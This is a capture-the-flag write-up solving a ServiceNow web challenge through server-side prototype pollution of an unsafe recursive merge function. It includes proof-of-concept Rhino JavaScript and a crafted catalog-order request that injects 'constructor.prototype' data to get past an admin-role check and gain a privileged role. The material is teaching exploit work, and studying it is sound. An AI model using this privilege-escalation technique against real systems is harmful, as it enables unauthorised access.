# SNOWFail

## Table of Contents

  1. [Overview](#overview)  
  2. [Background](#background)  
  3. [Enumeration](#enumeration)  
    3.1. [Local Testing](#local-testing)  
  4. [Exploitation](#exploitation)  
  5. [Conclusion](#conclusion)  

## Overview

- 1 solves / 500 points
- Difficulty: Medium
- Author: ahh
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

Flag is at [https://dev258962.service-now.com/flag](https://dev258962.service-now.com/flag), thats it! Oh you might need a special role for it, but I hear its not too hard to request.

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513182219.png)

## Enumeration

In this challenge, we'll first need to request a new account for the challenge's ServiceNow Utah PDI (Personal Developer Instance):

```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/SNOWfall)-[2024.05.13|18:24:28(HKT)]
└> wsrx connect wss://ctf.sdc.tf/api/proxy/0c14c592-a9dc-4da2-962b-d811b4c8e16d
2024-05-13T10:24:33.172052Z  INFO wsrx::cli::connect: Hi, I am not RX, RX is here -> 127.0.0.1:42255
2024-05-13T10:24:33.172089Z  WARN wsrx::cli::connect: wsrx will not report non-critical errors by default, you can set `RUST_LOG=wsrx=debug` to see more details.
```

```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|18:17:06(HKT)]
└> nc -n 127.0.0.1 42255                             
THIS SERVER IS JUST TO OBTAIN A CONNECTION.
PLEASE NOTE DOWN YOUR CREDENTIALS ONCE MADE.
PLEASE DO NOT MADE ADDITIONAL ACCOUNT REQUESTS UNLESS ABSOLUTELY NECESSARY.
IT IS NOT NEEDED FOR THE CHALLENGE, AND IT WILL SIMPLY GIVE YOU BACK THE SAME ACCOUNT RESET.
Please enter your team token: {Redacted}
Username: GZCTF_TEAM_249
Password: {Redacted}
```

Then we can login to the challenge's instance at [https://dev258962.service-now.com/sp](https://dev258962.service-now.com/sp):

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513182756.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513182808.png)

**In this challenge, we can get the flag at [https://dev258962.service-now.com/flag](https://dev258962.service-now.com/flag):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513184058.png)

However, we currently don't have access on this page, which responses us with a 404 page.

After poking around, we can find something interesting.

If we go to "Service Catalog", we can see there's an item called "**Flag Holder Application**":

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513185322.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513185332.png)

Let's click on that item!

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513185456.png)

In here, we can submit an application form for applying to be a **flag holder**.

The description said:

> Apply to be a flag holder! After filling out this form, **your answers will be automatically validated**. On approval by our administrator, you will **have the clearance to obtain flags** all by yourself!

Hmm... Let's try to submit it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513190241.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513190455.png)

Upon submission, it'll send a POST request to **`/api/sn_sc/v1/servicecatalog/items/a743658ac30202102a53fdec050131aa/order_now`** with the following JSON data:

```json
{
    "sysparm_quantity": "1",
    "variables":
    {
        "formatter": "true",
        "do_you_want_to_be_a_flag_holder": "Yes",
        "question_ctf_player_pickup_line": "Imagine Dragons deez nut on your face",
        "meta": "{\"time\":\"5/13/2024, 7:02:58 PM\",\"submitter\":\"884a802a830e82103f6120d0deaad322\",\"submitterName\":\"\"}",
        "question_color_palette_of_meal": "HSL(182, 65%, 34%)",
        "question_describe_food_taste": "My favorite food is a delectable buffer overflow, overwriting adjacent stego with savory shellcode.",
        "sdctf_share": "No",
        "question_toilet_flush": "67bfe283838646103f6120d0deaad371",
        "question_favorite_ice_shape": "ic_cube"
    },
    "sysparm_item_guid": "68ad6647838646103f6120d0deaad382",
    "get_portal_messages": "true",
    "sysparm_no_validation": "true",
    "engagement_channel": "sp",
    "referrer": "popular_items"
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513190403.png)

After submitting the application, we'll be redirected to `/sp?id=sc_request&is_new_order=true&table=sc_request&sys_id=<request_sys_id_from_response>`

In here, we can click on the item name's link and view our submitted form application:

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513190848.png)

Hmm... In here, we can see the system replied to us with:

```
I'm sorry but one or more of your responses had an issue. Please refer to the following feedback. We hope you apply again soon!  
  
  
You must select 4 colors.  
We only like 4D ice here.
```

As the application's description says, our answers will be **automatically** validated.

There's not much we can explore in here, let's **setup a local environment to dig through the logic behind this form application's validation processes**.

### Local Testing

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/Web/SNOWfall/SNOWfall.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/SNOWfall)-[2024.05.13|18:33:21(HKT)]
└> file SNOWfall.zip   
SNOWfall.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/SNOWfall)-[2024.05.13|18:33:23(HKT)]
└> unzip SNOWfall.zip 
Archive:  SNOWfall.zip
  inflating: README.md               
  inflating: SNOWfall.xml            
```

In the `README.md` file, it teaches us how to setup a **local environment** that we can test on:

```markdown
[...]
## How To Setup A Personal Developer Instance
- ServiceNow provides PDI's which allow you to have your own instance, identical to the one for this challenge
- You can create a free ServiceNow account, and follow the instructions here: 
    - https://developer.servicenow.com/dev.do#!/learn/learning-plans/utah/new_to_servicenow/app_store_learnv2_buildmyfirstapp_utah_personal_developer_instances
- Once you press Start Building, you will be sent to a similar instance like remote however you will have Admin permissions
- The SNOWfall.xml file is an Update Set, which can be imported into your instance to have the same configuration as the remote instance. 
    - Navigate to the following URL to import the Update Set:
        - [INSTANCE].service-now.com/sys_remote_update_set_list.do  
        - (Replace [INSTANCE] with your instance name)
    - Click on the Import Update Set from XML link
    - Choose the SNOWfall.xml file and press Upload
    - You will be navigated to the Update Set Record, press Preview Update Set
        - This job will likely error THIS IS EXPECTED
        - This error is due to differences in the instance (kind of like a merge conflict)
    - When you scroll down now, you should see a list of Update Set Preview Problems
        - For each problem you can "Accept remote update" to resolve the issue
    - Once all issues are resolved, press Commit Update Set
        - Now the Update Set is applied to your instance
        - You can test that this works by trying to visit `/flag` on your instance!
- In addition, you will need to enable the `com.glide.service-portal.user-criteria` plugin
    - Navigate to [INSTANCE].service-now.com/nav_to.do?uri=v_plugin.do?sys_id=ide.service_portal.user_criteria
    - Click the link "Activate/Repair" and press Activate
        - This will enable the plugin on your instance

## Tips
From here, the instance is essentially the exact same as the CTF instance. As an admin, you can analyze the updates made alot easier, as well as inspect the frontend / backend source code for various forms on the platform. You can use the All search bar to poke around. What might be helpful is to look at:
- [INSTANCE].service-now.com/sys_update_set_list.do
- Then click on the name SNOWFall, and scroll down through the Customer Updates. This shows every change that I made to the instance.

Note, to get an identical user account, you can navigate to:
- [INSTANCE].service-now.com/sys_user_list.do

Once here, press New and create a new user and set the User ID to `test_user`. Then press Submit. If you look back at the `/sys_user_list.do` endpoint, you should see the new user you created. If you go back into the user record, you should see a new `Set Password` button. In the modal, press Generate to generate a password, copy it, and then press Save Password. You can use this to login to the instance using a Non Admin session (I would recommend looking at it through incognito to avoid any session issues).
```

After setting up our local environment and a new `test_user` user, we can now **explore the provided updates (`SNOWfall.xml`)**!

- The challenge's PDI: **`dev258962`**
- My local testing environment PDI: **`dev254334`**

**Now, we can inspect the SNOWfall update logs at `/sys_update_set_list.do`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513191619.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513191643.png)

> Note: You can also view all the update logs in the `SNOWfall.xml` file, but it's gonna be very painful for you cuz it's full of XML syntax.

In here, we can see there're **98 update logs**. Let's dig through all of them! (Yes, I read all of them one by one xd)

After reading all the update logs, we can find the following logs are interesting:

**Type "Catalog Item" -> target name "Get Flag" (Action "DELETE"):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513192536.png)

Hmm... Looks like we need to **get the `flag_holder` role**...

**Type "Page" -> target name "flag_home" (Action "INSERT_OR_UPDATE"):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<record_update table="sp_page">
    <sp_page action="INSERT_OR_UPDATE">
        [...]
        <id>flag_home</id>
        <internal>false</internal>
        [...]
        <public>false</public>
        <roles>flag_holder</roles>
        [...]
    </sp_page>
    <sys_translated_text action="delete_multiple" query="documentkey=bad6ee0ec38602102a53fdec05013145"/>
</record_update>
```

Looks like **only role `flag_holder` can go to the `/flag` page**?

With that said, we have to **escalate our user's privilege by getting the `flag_holder` role**.

Uhh... How?

**Type "Workflow" -> target name "Flag Holder Application Workflow" (Action "INSERT_OR_UPDATE"):**

> Note: You can view this workflow in a graphical way at `/workflow_ide.do?sysparm_nostack=true&sysparm_use_polaris=false`. I don't know about that during the CTF :(

**In the XML data, we can see the following server-side JavaScript code:**
```javascript
function ifScript() {
    var now = new global.ServiceNowObjectUtils();
    var form_data = {}

    now.merge(form_data, JSON.parse(current.variables.meta));
    now.merge(form_data, current.variables)

    var ritm_data = {};
    now.merge(ritm_data, current);
    
    gs.info(JSON.stringify(form_data));
    var issues = [];
    
    // Validate form submission
    if (form_data.submitter != current.opened_by.sys_id) {
        issues.push('You don\'t seem to be the opener of this case.');
    }

    if (form_data.do_you_want_to_be_a_flag_holder !== 'Yes') {
        issues.push('You must want to be a flag holder.');
    }

    var HSLUtils = new global.HSLUtils();
    var colors = form_data.question_color_palette_of_meal.split('|');
    if (colors.length !== 4) {
        issues.push('You must select 4 colors.');
    }

    for (var i = 0; i < colors.length; i++) {
        if (!HSLUtils.test(colors[i])) {
            issues.push('Invalid color: ' + colors[i]);
        }
    }

    if (form_data.question_favorite_ice_shape !== 'ic_klein_bottle') {
        issues.push('We only like 4D ice here.');
    }

    if (form_data.question_describe_food_taste.length < 30) {
        issues.push('Please describe the taste of food in more detail.');
    }

    if (issues.length > 0) {
        workflow.scratchpad.issue_message = '\n' + issues.join('\n');
        workflow.scratchpad.issue_count = issues.length;
        return false;
    }

    return true;
}

answer = ifScript() ? 'yes' : 'no';
```

In here, we can see how the application validates our answers. The following is all the correct answers:

1. Do you want to be a flag holder? -> `Yes`
2. What was the color palette of your last meal today? Specify four colors in HSL. (separated by '|') -> `HSL(182, 65%, 34%) | HSL(45, 92%, 71%) | HSL(278, 45%, 63%) | HSL(94, 22%, 51%)`
3. Make a pickup line you think a CTF player would enjoy. -> `anything`
4. Does the toilet nearest to you flush counterclockwise or clockwise? Video proof helps. -> `anything`
5. What is your favorite shape of ice (in drinks)? -> `Klein Bottle`
6. Describe the taste of your favorite food exclusively using CTF terms/analogy. Minimum 30 characters. -> `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

So, when we submit the above answers, we should have the `flag_holder` role, right??

We can try that:

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513195351.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513195441.png)

Well, not yet.

**In the XML data, we can also see another server-side JavaScript code:**
```javascript
function ifScript() {
    var GlideRecordUtil = new global.GlideRecordUtil();
    var RoleModUtils = new global.RoleModUtils();

    var gr = new GlideRecord('sys_user_has_role');
    gr.addQuery('role', '2831a114c611228501d4ea6c309d626d'); // admin
    gr.query();

    do {
        var user_role_obj = {};
        GlideRecordUtil.populateFromGR(user_role_obj, gr);
        if (user_role_obj.user == current.opened_by) {
            RoleModUtils.addRole(current.opened_by, 'c60206c2c30602102a53fdec05013190');
            workflow.scratchpad.admin_message = "lgtm, added flag_holder role";
            return true;
        }
    } while (gr.next());
    
    workflow.scratchpad.admin_message = "nah sorry, we have been getting too many requests, maybe we are being hacked or something... :O";
    return false;
}

answer = ifScript() ? 'yes' : 'no';
```

In here, it uses the [`GlideRecord` class](https://docs.servicenow.com/bundle/utah-api-reference/page/app-store/dev_portal/API_reference/GlideRecord/concept/c_GlideRecordAPI.html) to get all the users ***who have `admin` role***.

It basically means, ***if the submitted form's user (`current.opened_by`) has `admin` role***, add `flag_holder` role to the user.

Wait what? We must have the `admin` role in order to get the `flag_holder` role??

Hmm... I wonder if we can **bypass that `admin` role check**...

**It's also worth noting that the first check is useless, as object `user_role_obj`'s attribute `user` is `undefined`:**
```javascript
do {
    var user_role_obj = {}; // empty object;
    GlideRecordUtil.populateFromGR(user_role_obj, gr);
    if (user_role_obj.user == current.opened_by) { // if (undefined == current.opened_by) {
        [...]
    }
} while (gr.next());
```

What can we do something about this? Hmm... Maybe we can **exploit Prototype Pollution (PP) to pollute (overwrite) the `user` Object's attribute**?

Uhh... Is there any PP vulnerability in the form validation process? Well, yes, it does!

**If you take a look at form validation code closely, you'll find this:**
```javascript
var now = new global.ServiceNowObjectUtils();
var form_data = {}

now.merge(form_data, JSON.parse(current.variables.meta));
[...]
```

In here, it uses **class `ServiceNowObjectUtils`'s `merge` method** to seemingly **merge a new object to another object**? Let's dive into that class deeper!

**Type "Script Include" -> target name "ServiceNowObjectUtils" (Action "INSERT_OR_UPDATE"):**
```javascript
var ServiceNowObjectUtils = Class.create();
ServiceNowObjectUtils.prototype = {
    initialize: function() {},

    merge: function(base, obj) {
        function isObject(obj) {
            return (typeof obj === 'object' || typeof obj === 'function') && (!String(obj.constructor.name).startsWith('Glide'));
        }

        for (var key in obj) {
            if (isObject(base[key]) && isObject(obj[key])) {
                this.merge(base[key], obj[key]);

            } else if (key in base) {
                continue;

            } else {
                if (obj[key].constructor && obj[key].constructor.name.startsWith('Glide')) {
                    // To normalize special Glide Objects that can't be traversed
                    base[key] = obj[key].toString();
                } else {
                    base[key] = obj[key];
                }
            }
        }
        return base;
    },
    type: 'ServiceNowObjectUtils'
};
```

In here, we can see the `merge` method is a **recursive merge function**, which means it **recursively merges an object into an existing object**.

However, if the recursive merge function **does NOT sanitize the keys, such as filters out key `__proto__`**, it's very likely to be **vulnerable to Prototype Pollution**. In our case, **the `merge` method doesn't sanitize the provided object's keys**! Therefore, class `ServiceNowObjectUtils` method `merge` is vulnerable to Prototype Pollution. More specifically, it's vulnerable to **Server-Side** Prototype Pollution, as it runs on the server-side.

> Note: For more information about Prototype Pollution, you could read this Medium blog post: [https://medium.com/@king.amit95/prototype-pollution-a-deeper-inspection-82a226796966](https://medium.com/@king.amit95/prototype-pollution-a-deeper-inspection-82a226796966).

Hmm... How can we **test it**?

In ServiceNow, we can **execute server-side JavaScript code via "Scripts - Background"** at `/sys.scripts.modern.do`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513205200.png)

Now we can debug and execute server-side JavaScript code!

**Let's test out our Prototype Pollution PoC (Proof-of-Concept) with the following code!**
```javascript
var now = new global.ServiceNowObjectUtils();
var form_data = {}

// {
//     "foo": "bar",
//     "__proto__":
//     {
//         "polluteTarget": "polluted"
//     }
// }
meta = '{"foo":"bar", "__proto__":{"polluteTarget":"polluted"}}';
gs.log("[*] Payload JSON object: " + meta);

gs.log("[*] Before polluted: " + JSON.stringify(Object.prototype.polluteTarget));
gs.log("[*] Before merged form_data: " + JSON.stringify(form_data));

now.merge(form_data, JSON.parse(meta));

gs.log("[*] After polluted: " + JSON.stringify(Object.prototype.polluteTarget));
gs.log("[*] After merged form_data: " + JSON.stringify(form_data));
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513212009.png)

**Result:**
```
*** Script: [*] Payload JSON object: {"foo":"bar", "__proto__":{"polluteTarget":"polluted"}}  
*** Script: [*] Before polluted: undefined  
*** Script: [*] Before merged form_data: {}  
*** Script: [*] After polluted: undefined  
*** Script: [*] After merged form_data: {"foo":"bar","__proto__":{"polluteTarget":"polluted"}}
```

Umm... Wait... It should be polluted, right?? Why attribute `polluteTarget` is still `undefined`, and the merged `form_data` object has `"__proto__":{"polluteTarget":"polluted"}`??

After the CTF has ended, the author of this challenge says this:

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513212237.png)

> Rhino is a JavaScript engine written fully in Java and managed by the Mozilla Foundation as open source software. It is separate from the SpiderMonkey engine, which is also developed by Mozilla, but written in C++ and used in Mozilla Firefox - [https://en.wikipedia.org/wiki/Rhino_(JavaScript_engine)](https://en.wikipedia.org/wiki/Rhino_(JavaScript_engine))

TLDR: Rhino is another JavaScript engine and [ServiceNow is using it in the server-side](https://www.servicenow.com/community/developer-articles/discover-the-benefits-of-ecmascript-how-es12-can-enhance/ta-p/2419996).

According to [Rhino documentation archive](https://www-archive.mozilla.org/rhino/overview), **`__proto__` is deprecated** long time ago:

> [...]The deprecated features are the `__proto__` and `__parent__` properties, and the constructors `With`, `Closure`, and `Call`. Attempts to invoke these constructors with the language version 1.4 will result in an error.[...]

Hmm... I guess maybe that's why `__proto__` didn't polluted attribute `polluteTarget`.

Luckily, there's an alternative: **`constructor.prototype`**. It's basically same as `__proto__` but in a different name.

**Let's try to use `constructor.prototype`!**
```javascript
var now = new global.ServiceNowObjectUtils();
var form_data = {}

// {
//     "foo": "bar",
//     "constructor":
//     {
//         "prototype":
//         {
//             "polluteTarget": "polluted"
//         }
//     }
// }
meta = '{"foo":"bar", "constructor":{"prototype":{"polluteTarget":"polluted"}}}';
gs.log("[*] Payload JSON object: " + meta);

gs.log("[*] Before polluted: " + JSON.stringify(Object.prototype.polluteTarget));
gs.log("[*] Before merged form_data: " + JSON.stringify(form_data));

now.merge(form_data, JSON.parse(meta));

gs.log("[*] After polluted: " + JSON.stringify(Object.prototype.polluteTarget));
gs.log("[*] After merged form_data: " + JSON.stringify(form_data));
```

**Result:**
```
*** Script: [*] Payload JSON object: {"foo":"bar", "constructor":{"prototype":{"polluteTarget":"polluted"}}}  
*** Script: [*] Before polluted: undefined  
*** Script: [*] Before merged form_data: {}  
*** Script: [*] After polluted: "polluted"  
*** Script: [*] After merged form_data: {"foo":"bar"}
```

Let's go!!! It worked! **Now all objects that didn't define attribute `polluteTarget`'s value will become string `"polluted"`**!

That being said, we can now pollute the `user` attribute!

But **what value should we pollute**?

**Hmm... Let's take a look at the `user_role_obj.user` value:**
```javascript
var GlideRecordUtil = new global.GlideRecordUtil();

var gr = new GlideRecord('sys_user_has_role');
gr.addQuery('role', '2831a114c611228501d4ea6c309d626d'); // admin
gr.query();

do {
    var user_role_obj = {};
    GlideRecordUtil.populateFromGR(user_role_obj, gr);
    gs.info(user_role_obj.user);
} while (gr.next());
```

**Result:**
```
*** Script: undefined  
*** Script: 6816f79cc0a8016401c5a33be04be441  
*** Script: 0d5b61dfc0a8026601c8e80d8bb57f6e  
*** Script: 5137153cc611227c000bbd1bd8cd2005  
*** Script: 45a1b90dc3313000bac1addbdfba8fe8  
*** Script: 8d56406a0a0a0a6b004070b354aada28  
*** Script: 9142b90dc3313000bac1addbdfba8f8d  
*** Script: 8d5938070a0a0a6b00f8a5e8d3375606  
*** Script: 9112fd0dc3313000bac1addbdfba8f95  
*** Script: 97000fcc0a0a0a6e0104ca999f619e5b  
*** Script: 0802b90dc3313000bac1addbdfba8fdb  
*** Script: 46c1293aa9fe1981000dc753e75ebeee  
*** Script: c4713d0dc3313000bac1addbdfba8ff3  
*** Script: 9ce1b90dc3313000bac1addbdfba8ff1  
*** Script: 5137153cc611227c000bbd1bd8cd2007  
*** Script: 5b7c200d0a640069006b3845b5d0fa7c  
*** Script: 62d78687c0a8010e00b3d84178adc913  
*** Script: 5137153cc611227c000bbd1bd8cd2006
```

It looks like an ID... Maybe it's a user ID?

Let's try to search the first ID, we can do that in the user list at `/sys_user_list.do`.

After some searching, we can know that those IDs are **`sys_id` (System ID)**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513214816.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513214856.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513214909.png)

And the first `sys_id` is the `admin` user.

Hmm... I wonder how we can get our own user's `sys_id`.

Fortunately, when we submit the "Flag Holder Application" form, the "Flag Holder Application Workflow" will automatically populate our user's `sys_id` and included in the POST request data:

**Type "Catalog Client Scripts" -> target name "Populate Catalog Item Meta data" (Action "INSERT_OR_UPDATE"):**
```javascript
function onSubmit() {
    // Populate the "meta" variable with a JSON object containing the catalog item metadata
     var meta = {};
     var time = new Date(); 
     var submitter = g_user.userID;
     var submitterName = g_user.getFullName();
 
     meta.time = time.toLocaleString(); 
     meta.submitter = submitter;
     meta.submitterName = submitterName;
 
     g_form.setValue('meta', JSON.stringify(meta));
 }
```

So, we can get our user's `sys_id` by submitting the application form in the JSON stringified `submitter` value.

> Note: There're many ways to retrieve our user's `sys_id`, this is just one of them.

## Exploitation

Armed with above information, we can finally get the flag by having the `flag_holder` role!

To do so, we'll first **jot down our user's `sys_id` and `question_toilet_flush`'s value** when we submit the application form.

In my case, it's **`sys_id = 884a802a830e82103f6120d0deaad322`, `question_toilet_flush = 92cb91c7834246103f6120d0deaad34b`**.

> Note: Everyone's `question_toilet_flush` value is different, that's why you'll need to jot it down. 

**Then, send the following POST request on the challenge's PDI:**
```http
POST /api/sn_sc/v1/servicecatalog/items/a743658ac30202102a53fdec050131aa/order_now HTTP/1.1
Host: dev254334.service-now.com
Cookie: <YOUR_COOKIES>
Content-Type: application/json;charset=utf-8
Content-Length: 757
X-Usertoken: <YOUR_Usertoken>
X-Transaction-Source: Interface=Web,Interface-Name=SP,Interface-Type=Service Portal,Interface-SysID=81b75d3147032100ba13a5554ee4902b
X-Use-Polaris: false

{"sysparm_quantity":"1","variables":{"formatter":"true","do_you_want_to_be_a_flag_holder":"Yes","question_ctf_player_pickup_line":"anything","{\"time\":\"5/13/2024, 12:56:31 PM\",\"submitter\":\"884a802a830e82103f6120d0deaad322\",\"submitterName\":\"\",\"constructor\":{\"prototype\":{\"user\":\"<YOUR_sys_id>\"}}}","question_color_palette_of_meal":"HSL(182, 65%, 34%) | HSL(45, 92%, 71%) | HSL(278, 45%, 63%) | HSL(94, 22%, 51%)","question_describe_food_taste":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","sdctf_share":"No","question_toilet_flush":"<YOUR_question_toilet_flush>","question_favorite_ice_shape":"ic_klein_bottle"},"sysparm_item_guid":"7f59b287c34ac210e706d54d05013193","get_portal_messages":"true","sysparm_no_validation":"true","engagement_channel":"sp","referrer":"popular_items"}
```

> Remember replace the `<YOUR_COOKIES>`, `<YOUR_Usertoken>`, `<YOUR_sys_id>`, and `<YOUR_question_toilet_flush>` with yours value.

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513220630.png)

After sending the POST request, you should have `flag_holder` role. **Then, go to `/flag` and you should get the flag**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513220823.png)

- **Flag: `sdctf{1_GUE55_1_5houLDA_STuCk_witH_TH3_n0_Code_c12259}`**

## Conclusion

What we've learned:

1. Server-Side Prototype Pollution